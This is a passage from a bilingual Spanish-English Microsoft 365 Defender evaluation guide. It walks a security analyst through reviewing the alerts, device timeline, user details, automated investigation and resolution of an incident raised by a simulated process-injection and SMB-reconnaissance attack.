<span data-ttu-id="bcdcc-207">Microsoft 365 Defender correlaciona análisis y agrega todas las alertas e investigaciones relacionadas de diferentes productos en una entidad de incidentes.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="bcdcc-208">Al hacerlo, Microsoft 365 Defender muestra una historia de ataque más amplia, lo que permite al analista de SOC comprender y responder a amenazas complejas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="bcdcc-209">Las alertas generadas durante esta simulación están asociadas con la misma amenaza y, como resultado, se agregan automáticamente como un único incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="bcdcc-210">Para ver el incidente:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-210">To view the incident:</span></span>

1. <span data-ttu-id="bcdcc-211">Abra el [portal Microsoft 365 Defender](https://security.microsoft.com/).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="bcdcc-212">En el panel de navegación, seleccione **Incidentes & alertas > incidentes**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="bcdcc-213">Seleccione el elemento más reciente haciendo clic en el círculo situado a la izquierda del nombre del incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="bcdcc-214">Un panel lateral muestra información adicional sobre el incidente, incluidas todas las alertas relacionadas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="bcdcc-215">Cada incidente tiene un nombre único que lo describe en función de los atributos de las alertas que incluye.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   <span data-ttu-id="bcdcc-216">Las alertas que se muestran en el panel se pueden filtrar en función de los recursos de servicio: Microsoft Defender para identity, Microsoft Cloud App Security, Microsoft Defender para endpoint, Microsoft 365 Defender y Microsoft Defender para Office 365.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="bcdcc-217">Seleccione **Abrir página de incidentes** para obtener más información sobre el incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="bcdcc-218">En la **página** Incidente, puede ver todas las alertas e información relacionadas con el incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="bcdcc-219">La información incluye las entidades y activos que participan en la alerta, el origen de detección de las alertas (como Microsoft Defender para Identity o Microsoft Defender para Endpoint) y el motivo por el que se vincularon.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="bcdcc-220">Al revisar la lista de alertas de incidentes se muestra la progresión del ataque.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="bcdcc-221">Desde esta vista, puede ver e investigar las alertas individuales.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="bcdcc-222">También puede hacer clic en **Administrar incidente** en el menú de la derecha, para etiquetar el incidente, asignarlo a usted mismo y agregar comentarios.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="bcdcc-223">Revisar alertas generadas</span><span class="sxs-lookup"><span data-stu-id="bcdcc-223">Review generated alerts</span></span>

<span data-ttu-id="bcdcc-224">Veamos algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="bcdcc-225">Solo recorreremos algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="bcdcc-226">Según la versión de Windows y los productos Microsoft 365 Defender que se ejecutan en el dispositivo de prueba, es posible que veas más alertas que aparecen en un orden ligeramente diferente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Ejemplo de las alertas generadas](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="bcdcc-228">Alerta: Se observó una inyección de proceso sospechosa (Origen: Microsoft Defender para endpoint)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="bcdcc-229">Los atacantes avanzados usan métodos sofisticados y furtivos para conservar la memoria y ocultarse de las herramientas de detección.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="bcdcc-230">Una técnica común es operar desde dentro de un proceso de sistema de confianza en lugar de un ejecutable malintencionado, lo que hace difícil que las herramientas de detección y las operaciones de seguridad detecten el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="bcdcc-231">Para permitir que los analistas de SOC puedan detectar estos ataques avanzados, los sensores de memoria profunda de Microsoft Defender para endpoint proporcionan a nuestro servicio en la nube una visibilidad sin precedentes de una variedad de técnicas de inyección de código entre procesos.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="bcdcc-232">En la siguiente figura se muestra cómo Defender for Endpoint detectó y alertó sobre el intento de insertar código en <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Ejemplo de la alerta para la inyección de código potencialmente malintencionado](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="bcdcc-234">Alerta: comportamiento inesperado observado por un proceso ejecutado sin argumentos de línea de comandos (Source: Microsoft Defender for Endpoint)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="bcdcc-235">Las detecciones de Puntos de conexión de Microsoft Defender suelen tener como destino el atributo más común de una técnica de ataque.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="bcdcc-236">Este método garantiza la durabilidad y aumenta la barra para que los atacantes cambien a tácticas más recientes.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="bcdcc-237">Empleamos algoritmos de aprendizaje a gran escala para establecer el comportamiento normal de los procesos comunes dentro de una organización y en todo el mundo y observamos cuándo estos procesos muestran comportamientos anómalos.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="bcdcc-238">Estos comportamientos anómalos a menudo indican que se introdujo código extraño y se está ejecutando en un proceso de confianza.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="bcdcc-239">En este escenario, el proceso <i>notepad.exe</i> muestra un comportamiento anormal, que implica la comunicación con una ubicación externa.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="bcdcc-240">Este resultado es independiente del método específico usado para introducir y ejecutar el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="bcdcc-241">Dado que esta alerta se basa en modelos de aprendizaje automático que requieren procesamiento back-end adicional, puede tardar algún tiempo antes de ver esta alerta en el portal.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="bcdcc-242">Tenga en cuenta que los detalles de la alerta incluyen la dirección IP externa, un indicador que puede usar como pivote para expandir la investigación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="bcdcc-243">Seleccione la dirección IP en el árbol del proceso de alerta para ver la página de detalles de la dirección IP.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Ejemplo de la alerta de comportamiento inesperado de un proceso ejecutado sin argumentos de línea de comandos](../../media/mtp/fig8.png)

<span data-ttu-id="bcdcc-245">En la siguiente figura se muestra la página de detalles de dirección IP seleccionada (haciendo clic en dirección IP en el árbol de proceso alerta).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![Ejemplo de la página de detalles de la dirección IP](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="bcdcc-247">Alerta: Reconocimiento de direcciones IP y de usuario (SMB) (Origen: Microsoft Defender para la identidad)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="bcdcc-248">La enumeración mediante el protocolo bloque de mensajes de servidor (SMB) permite a los atacantes obtener información de inicio de sesión de usuario reciente que les ayuda a moverse lateralmente por la red para obtener acceso a una cuenta confidencial específica.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="bcdcc-249">En esta detección, se desencadena una alerta cuando la enumeración de sesión SMB se ejecuta en un controlador de dominio.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Ejemplo de la alerta de Identidad de Microsoft Defender para reconocimiento de direcciones IP y de usuario](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="bcdcc-251">Revisar la escala de tiempo del dispositivo con Microsoft Defender para endpoint</span><span class="sxs-lookup"><span data-stu-id="bcdcc-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="bcdcc-252">Después de explorar las distintas alertas de este incidente, vuelva a la página de incidentes que investigó anteriormente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="bcdcc-253">Selecciona la **pestaña Dispositivos** en la página incidente para revisar los dispositivos implicados en este incidente según lo informado por Microsoft Defender para Endpoint y Microsoft Defender for Identity.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="bcdcc-254">Selecciona el nombre del dispositivo donde se realizó el ataque para abrir la página de entidad para ese dispositivo específico.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="bcdcc-255">En esa página, puede ver alertas que se desencadenaron y eventos relacionados.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="bcdcc-256">Selecciona la **pestaña** Escala de tiempo para abrir la escala de tiempo del dispositivo y ver todos los eventos y comportamientos observados en el dispositivo en orden cronológico, intercalados con las alertas generadas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Ejemplo de la escala de tiempo del dispositivo con comportamientos](../../media/mtp/fig11.png)

<span data-ttu-id="bcdcc-258">La expansión de algunos de los comportamientos más interesantes proporciona detalles útiles, como árboles de proceso.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="bcdcc-259">Por ejemplo, desplácese hacia abajo hasta que encuentre el evento de alerta **Inserción de proceso sospechoso observada**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="bcdcc-260">Seleccione elpowershell.exe se inserta **notepad.exe** un evento de proceso debajo de él, para  mostrar el árbol de proceso completo para este comportamiento en el gráfico Entidades de eventos en el panel lateral.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="bcdcc-261">Use la barra de búsqueda para filtrar si es necesario.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-261">Use the search bar for filtering if necessary.</span></span>

![Ejemplo del árbol de proceso para el comportamiento de creación de archivos de PowerShell seleccionado](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="bcdcc-263">Revise la información del usuario con Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="bcdcc-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="bcdcc-264">En la página incidente, seleccione la **pestaña Usuarios** para mostrar la lista de usuarios implicados en el ataque.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="bcdcc-265">La tabla contiene información adicional sobre cada usuario, incluida la puntuación prioridad de **investigación de cada** usuario.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="bcdcc-266">Seleccione el nombre de usuario para abrir la página de perfil del usuario donde se puede llevar a cabo una investigación adicional.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="bcdcc-267">[Obtenga más información sobre cómo investigar usuarios de riesgo.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Ejemplo de Cloud App Security de usuario](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="bcdcc-269">Investigación y corrección automatizadas</span><span class="sxs-lookup"><span data-stu-id="bcdcc-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="bcdcc-270">Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para familiarizarse con lo que es la autoproducción automatizada, dónde encontrarla en el portal y cómo puede ayudar en las operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="bcdcc-271">Vuelva al incidente en el portal de Microsoft 365 Defender web.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="bcdcc-272">La **pestaña Investigaciones** de **la** página Incidentes muestra las investigaciones automatizadas desencadenadas por Microsoft Defender para Identity y Microsoft Defender para endpoint.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="bcdcc-273">La captura de pantalla siguiente muestra solo la investigación automatizada desencadenada por Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="bcdcc-274">De forma predeterminada, Defender para endpoint corrige automáticamente los artefactos encontrados en la cola, lo que requiere corrección.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Ejemplo de las investigaciones automatizadas relacionadas con el incidente](../../media/mtp/fig14.png)

<span data-ttu-id="bcdcc-276">Seleccione la alerta que desencadenó una investigación para abrir la **página Detalles de la** investigación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="bcdcc-277">Verá los siguientes detalles:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-277">You'll see the following details:</span></span>

- <span data-ttu-id="bcdcc-278">Alertas que desencadenaron la investigación automatizada.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="bcdcc-279">Usuarios y dispositivos afectados.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-279">Impacted users and devices.</span></span> <span data-ttu-id="bcdcc-280">Si se encuentran indicadores en dispositivos adicionales, estos dispositivos adicionales también aparecerán en la lista.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="bcdcc-281">Lista de pruebas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-281">List of evidence.</span></span> <span data-ttu-id="bcdcc-282">Las entidades encontradas y analizadas, como archivos, procesos, servicios, controladores y direcciones de red.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="bcdcc-283">Estas entidades se analizan para posibles relaciones con la alerta y se califican como benignas o malintencionadas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="bcdcc-284">Amenazas encontradas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-284">Threats found.</span></span> <span data-ttu-id="bcdcc-285">Amenazas conocidas que se encuentran durante la investigación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="bcdcc-286">Según el tiempo, es posible que la investigación automatizada aún se esté ejecutando.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="bcdcc-287">Espere unos minutos a que se complete el proceso antes de recopilar y analizar la evidencia y revisar los resultados.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="bcdcc-288">Actualice la **página Detalles de investigación** para obtener los resultados más recientes.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Ejemplo de la página detalles de investigación](../../media/mtp/fig15.png)

<span data-ttu-id="bcdcc-290">Durante la investigación automatizada, Microsoft Defender para Endpoint identificó el proceso notepad.exe, que se inyectó como uno de los artefactos que requerían corrección.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="bcdcc-291">Defender for Endpoint detiene automáticamente la inyección de procesos sospechosos como parte de la corrección automatizada.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="bcdcc-292">Puedes ver cómo <i>notepad.exe</i> de la lista de procesos en ejecución en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="bcdcc-293">Resolver el incidente</span><span class="sxs-lookup"><span data-stu-id="bcdcc-293">Resolve the incident</span></span>

<span data-ttu-id="bcdcc-294">Una vez completada la investigación y confirmada su corrección, resolverá el incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="bcdcc-295">En la **página** Incidente, seleccione **Administrar incidente**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="bcdcc-296">Establezca el estado en **Resolver incidente** y seleccione **Alerta verdadera** para la clasificación y **pruebas de seguridad** para la determinación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![Ejemplo de la página incidentes con el panel administrar incidentes abierto donde puede hacer clic en el modificador para resolver incidentes](../../media/mtp/fig16.png)

<span data-ttu-id="bcdcc-298">Cuando se resuelve el incidente, resuelve todas las alertas asociadas en Microsoft 365 Defender portal y en los portales relacionados.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="bcdcc-299">Esto ajusta la simulación de ataque para el análisis de incidentes, la investigación automatizada y la resolución de incidentes.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="bcdcc-300">Paso siguiente</span><span class="sxs-lookup"><span data-stu-id="bcdcc-300">Next step</span></span>

<span data-ttu-id="bcdcc-301">[![Pruebe Microsoft 365 Defender capacidades de respuesta a incidentes](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="bcdcc-302">Paso 2 de 2: [Probar Microsoft 365 Defender capacidades de respuesta a incidentes](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="bcdcc-303">Navegación que puede necesitar</span><span class="sxs-lookup"><span data-stu-id="bcdcc-303">Navigation you may need</span></span>

[<span data-ttu-id="bcdcc-304">Crear el entorno Microsoft 365 Defender evaluación</span><span class="sxs-lookup"><span data-stu-id="bcdcc-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
